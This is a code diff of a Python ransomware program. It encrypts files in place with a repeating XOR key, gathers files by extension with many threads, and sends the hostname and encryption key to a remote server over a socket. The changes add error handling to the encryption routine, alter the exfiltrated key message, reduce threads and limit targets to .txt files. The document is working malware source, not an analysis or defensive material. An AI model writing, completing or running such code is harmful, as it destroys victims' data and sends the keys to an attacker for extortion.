@@ -48,7 +48,7 @@ def connection(ip, port, generated_key): # takes a string IP, int port and strin
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # create socket object
     s.connect((server_ip, server_port))                         # connect to server
-    s.send((f'[{time}] - {hostname}:{key}').encode("UTF-8"))    # send info
+    s.send((f'[{time}] - {hostname} Key:{key}').encode("UTF-8"))    # send info
     s.close()                                                   # and dip out
 
 
@@ -57,19 +57,27 @@ def encrypt(file, key, encryption_level):
     # TODO: encryption logic here
     index = 0
     max_index = encryption_level - 1
-    #try:
-    with open(file, "rb") as f:
-        data = f.read()
-    with open(file, "wb") as f:
-        for byte in data:
-            xor_byte = byte ^ ord(key[index])
-            f.write(xor_byte.to_bytes(1, sys.byteorder))
-            if index >= max_index:
-                index = 0
-            else:
-                index += 1
-    #except:
-    #print("Failed to encrypt {file}")
+    try:
+        with open(file, "rb") as f:
+            data = f.read()
+        with open(file, "wb") as f:
+            for byte in data:
+                xor_byte = byte ^ ord(key[index])
+                f.write(xor_byte.to_bytes(1, sys.byteorder))
+                if index >= max_index:
+                    index = 0
+                else:
+                    index += 1
+    except FileNotFoundError:
+        print("File not Found")
+    except PermissionError:
+        print("No permission to access this")
+    except IsADirectoryError:
+        print("This is a directory")
+    #except OsError as e:
+        #print("Error: ", e)
+    except:
+        print("Something went wrong :c")
     
 
 def main():
@@ -80,9 +88,9 @@ def main():
         quit()
 
     # collect all files from the system into a list
-    NUM_THREADS = 400 
+    NUM_THREADS = 100 
     threads = []
-    extensions = (".txt", ".py", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh", ".png", ".jpg")
+    extensions = (".txt") #".py", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh", ".png", ".jpg")
     """
     for i in range(NUM_THREADS):
         t = threading.Thread(target=collect, args=extensions)
